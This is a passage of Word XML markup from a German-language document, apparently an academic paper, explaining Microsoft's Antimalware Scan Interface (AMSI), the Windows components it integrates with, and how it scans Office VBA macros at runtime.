        <w:t xml:space="preserve">es sich beim </w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Antimalware Scan Interface (AMSI)</w:t>
      </w:r>
      <w:r w:rsidR="00636132" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> eigentlich handelt und begab mich zur </w:t>
      </w:r>
      <w:r w:rsidR="00416BC1" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>offiziellen</w:t>
      </w:r>
      <w:r w:rsidR="00636132" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Dokumentation von Microsoft. </w:t>
      </w:r>
      <w:r w:rsidR="00CB7F5F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Diese beschreibt AMSI als </w:t>
      </w:r>
      <w:r w:rsidR="008E13D8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>ein</w:t>
      </w:r>
      <w:r w:rsidR="001C2640">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>en</w:t>
      </w:r>
      <w:r w:rsidR="008E13D8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> vielseitiger Schnittstellenstandard, der es Anwendungen und Diensten ermöglicht, sich mit jedem Antimalware-Produkt zu integrieren, </w:t>
      </w:r>
      <w:r w:rsidR="00F64398">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>welche</w:t>
      </w:r>
      <w:r w:rsidR="008E13D8" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> auf einem Rechner vorhanden ist.</w:t>
      </w:r>
      <w:r w:rsidR="00F06A51" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="003C4A60" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Weiters </w:t>
      </w:r>
      <w:r w:rsidR="008D1490" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>handelt es sich um ein Tool, welches</w:t>
      </w:r>
      <w:r w:rsidR="003C4A60" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> unabhängig von Malware-Anbietern</w:t>
      </w:r>
      <w:r w:rsidR="008D1490" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> ist. Es </w:t>
      </w:r>
      <w:r w:rsidR="003C4A60" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wurde entwickelt, um die gängigsten Malware-Scan- und Schutztechniken zu ermöglichen, die von heutigen Antimalware-Produkten bereitgestellt werden, die in Anwendungen integriert werden können.</w:t>
      </w:r>
      <w:r w:rsidR="008B0978" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#1fc4880e-3a26-4e27-8328-474aeed31af6"/>
          <w:id w:val="1227409296"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="008B0978" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="008B0978" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="008B0978" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[1]</w:t>
          </w:r>
          <w:r w:rsidR="008B0978" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
    </w:p>
    <w:p w14:paraId="31CC6911" w14:textId="09E77524" w:rsidR="001770D6" w:rsidRPr="00B47CB9" w:rsidRDefault="001770D6" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="0F858FE4" w14:textId="180C62DA" w:rsidR="001770D6" w:rsidRPr="00B47CB9" w:rsidRDefault="008B0978" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Innerhalb von Windows 10 ist AMSI in folgenden Komponenten integriert</w:t>
      </w:r>
      <w:r w:rsidR="007B094C" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#21e7ae2b-75cb-44f3-95cf-397fa4aba863"/>
          <w:id w:val="346673680"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="007B094C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="007B094C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="007B094C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[1]</w:t>
          </w:r>
          <w:r w:rsidR="007B094C" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="3B59E42D" w14:textId="02936812" w:rsidR="008B0978" w:rsidRPr="00B47CB9" w:rsidRDefault="008B0978" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="605D04EF" w14:textId="18739A89" w:rsidR="007B094C" w:rsidRPr="00B47CB9" w:rsidRDefault="007B094C" w:rsidP="007B094C">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>User Account Control</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6B933FDB" w14:textId="59D313DB" w:rsidR="007B094C" w:rsidRPr="00B47CB9" w:rsidRDefault="007B094C" w:rsidP="007B094C">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>PowerShell</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0B059824" w14:textId="3BABDE6A" w:rsidR="007B094C" w:rsidRPr="00B47CB9" w:rsidRDefault="007B094C" w:rsidP="007B094C">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Windows Script Host</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="70AA5FFD" w14:textId="62743A65" w:rsidR="007B094C" w:rsidRPr="00B47CB9" w:rsidRDefault="007B094C" w:rsidP="00EA1D9C">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>JavaScript</w:t>
      </w:r>
      <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>VBScript</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6C0C2638" w14:textId="5EF85EDB" w:rsidR="008B0978" w:rsidRPr="00B47CB9" w:rsidRDefault="007B094C" w:rsidP="007B094C">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="39"/>
        </w:numPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Office VBA Makros</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="037FDDDF" w14:textId="77777777" w:rsidR="00F71D43" w:rsidRPr="00B47CB9" w:rsidRDefault="00F71D43" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4F6B425B" w14:textId="726586EC" w:rsidR="00C16E2A" w:rsidRPr="00B47CB9" w:rsidRDefault="000C6F13" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Die Architektur von AMSI wurde </w:t>
      </w:r>
      <w:r w:rsidR="00F5200E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>von Microsoft wie folgt visualisiert</w:t>
      </w:r>
      <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#1ef84170-4f47-42f3-b461-6f1239edb85b"/>
          <w:id w:val="-427583022"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[2]</w:t>
          </w:r>
          <w:r w:rsidR="0078045F" w:rsidRPr="00B47CB9">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00F5200E" w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="5E2B3EE1" w14:textId="77777777" w:rsidR="00F5200E" w:rsidRPr="00B47CB9" w:rsidRDefault="00F5200E" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="4966E139" w14:textId="77777777" w:rsidR="0078045F" w:rsidRPr="00B47CB9" w:rsidRDefault="0078045F" w:rsidP="0078045F">
      <w:pPr>
        <w:keepNext/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00B47CB9">
        <w:rPr>
          <w:noProof/>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="5FBA97D9" wp14:editId="39006439">
            <wp:extent cx="4327762" cy="1948208"/>
            <wp:effectExtent l="19050" t="19050" r="15875" b="13970"/>
            <wp:docPr id="101" name="Grafik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32377" cy="1950286"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                    <a:ln>
                      <a:solidFill>
                        <a:schemeClr val="tx1"/>
                      </a:solidFill>
                    </a:ln>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="472E3270" w14:textId="77777777" w:rsidR="002945C0" w:rsidRPr="00B47CB9" w:rsidRDefault="002945C0" w:rsidP="001770D6">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="44EA3303" w14:textId="4A05F61E" w:rsidR="00AC6770" w:rsidRDefault="00AC6770" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">In Bezug auf JavaScript und </w:t>
      </w:r>
      <w:r w:rsidR="00A56DB2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">VBA </w:t>
      </w:r>
      <w:r w:rsidR="00930CD9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">illustriert Microsoft folgenden Workflow </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#ef85bf10-509b-4c99-9b27-170c4d622daf"/>
          <w:id w:val="-1124155295"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="000E27AC">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="000E27AC">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="000E27AC">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[3]</w:t>
          </w:r>
          <w:r w:rsidR="000E27AC">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00BF5761">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidR="00C36EEF">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>im Zusammenhang mit einem ausgeführten Makro in Office</w:t>
      </w:r>
      <w:r w:rsidR="00930CD9">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">: </w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="789CA5B7" w14:textId="6BDADA8F" w:rsidR="00AC6770" w:rsidRDefault="00AC6770" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="45FF9C1B" w14:textId="170C8123" w:rsidR="00BF5761" w:rsidRDefault="00BF5761" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:noProof/>
        </w:rPr>
        <w:drawing>
          <wp:inline distT="0" distB="0" distL="0" distR="0" wp14:anchorId="55C2E1B2" wp14:editId="33F4C3F2">
            <wp:extent cx="5759450" cy="2977515"/>
            <wp:effectExtent l="0" t="0" r="0" b="0"/>
            <wp:docPr id="133" name="Grafik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59450" cy="2977515"/>
                    </a:xfrm>
                    <a:prstGeom prst="rect">
                      <a:avLst/>
                    </a:prstGeom>
                  </pic:spPr>
                </pic:pic>
              </a:graphicData>
            </a:graphic>
          </wp:inline>
        </w:drawing>
      </w:r>
    </w:p>
    <w:p w14:paraId="6D760B44" w14:textId="1198ACFB" w:rsidR="00AC6770" w:rsidRDefault="00AC6770" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="2930C3F8" w14:textId="374E1E0A" w:rsidR="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Dieser Workflow </w:t>
      </w:r>
      <w:r w:rsidR="0001483C">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>wurde von Microsoft wie folgt beschrieben</w:t>
      </w:r>
      <w:r w:rsidR="00162DC2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:sdt>
        <w:sdtPr>
          <w:rPr>
            <w:lang w:val="de-AT"/>
          </w:rPr>
          <w:alias w:val="Don't edit this field"/>
          <w:tag w:val="CitaviPlaceholder#c64fc1fb-4fd2-4f98-8ba6-bef4c8074093"/>
          <w:id w:val="1429013115"/>
          <w:placeholder>
            <w:docPart w:val="DefaultPlaceholder_-1854013440"/>
          </w:placeholder>
        </w:sdtPr>
        <w:sdtEndPr/>
        <w:sdtContent>
          <w:r w:rsidR="00162DC2">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="begin"/>
          </w:r>
          <w:r w:rsidR="003A23EE">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:instrText>ADDIN CitaviPlaceholder{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}</w:instrText>
          </w:r>
          <w:r w:rsidR="00162DC2">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="separate"/>
          </w:r>
          <w:r w:rsidR="00162DC2">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:t>[3]</w:t>
          </w:r>
          <w:r w:rsidR="00162DC2">
            <w:rPr>
              <w:lang w:val="de-AT"/>
            </w:rPr>
            <w:fldChar w:fldCharType="end"/>
          </w:r>
        </w:sdtContent>
      </w:sdt>
      <w:r w:rsidR="00162DC2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>:</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="0E4268AB" w14:textId="77777777" w:rsidR="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="008E5847">
      <w:pPr>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
    </w:p>
    <w:p w14:paraId="364FE441" w14:textId="3887A719" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der Benutzer erhält ein Dokumen</w:t>
      </w:r>
      <w:r w:rsidR="00162DC2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>t. Dieses enthält ein</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> Makro, das sich statischen Scans von Antivirensoftware durch Techniken wie Verschleierung, kennwortgeschützte Dateien oder andere entzieht.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="31F461CA" w14:textId="375198C8" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>Der Benutzer öffnet dann das Dokument</w:t>
      </w:r>
      <w:r w:rsidR="00162DC2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, welches</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> das Makro enthält. Wenn das Dokument in der geschützten Ansicht geöffnet wird, klickt der Benutzer auf "Bearbeitung aktivieren", um die geschützte Ansicht zu verlassen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="07584380" w14:textId="1A7F79A5" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Der Benutzer klickt </w:t>
      </w:r>
      <w:r w:rsidR="00162DC2">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">anschließend </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>auf "Makros aktivieren", um die Ausführung von Makros zuzulassen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="6022330E" w14:textId="2DEB758C" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Während das Makro ausgeführt wird, verwendet die VBA-Laufzeitumgebung einen </w:t>
      </w:r>
      <w:r w:rsidR="00AA3F28">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>zirkulären Speicher (FIFO)</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>, um</w:t>
      </w:r>
      <w:r>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Daten und Parameter zu </w:t>
      </w:r>
      <w:r w:rsidR="009A35CA">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>loggen</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">, </w:t>
      </w:r>
      <w:r w:rsidR="00542D9F">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>welche</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> sich auf Aufrufe von Win32-, COM- und VBA-APIs beziehen.</w:t>
      </w:r>
    </w:p>
    <w:p w14:paraId="1B0D8AB6" w14:textId="7C02182E" w:rsidR="00DB3FD4" w:rsidRPr="00DB3FD4" w:rsidRDefault="00DB3FD4" w:rsidP="00DB3FD4">
      <w:pPr>
        <w:pStyle w:val="Listenabsatz"/>
        <w:numPr>
          <w:ilvl w:val="0"/>
          <w:numId w:val="43"/>
        </w:numPr>
        <w:ind w:left="284" w:hanging="284"/>
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
      </w:pPr>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Wenn bestimmte Win32- oder COM-APIs, </w:t>
      </w:r>
      <w:r w:rsidR="006C2AC1">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">welche </w:t>
      </w:r>
      <w:r w:rsidR="00681FB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t>mit</w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve"> hohe</w:t>
      </w:r>
      <w:r w:rsidR="00681FB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">m </w:t>
      </w:r>
      <w:r w:rsidRPr="00DB3FD4">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
        <w:t xml:space="preserve">Risiko </w:t>
      </w:r>
      <w:r w:rsidR="00681FB0">
        <w:rPr>
          <w:lang w:val="de-AT"/>
        </w:rPr>
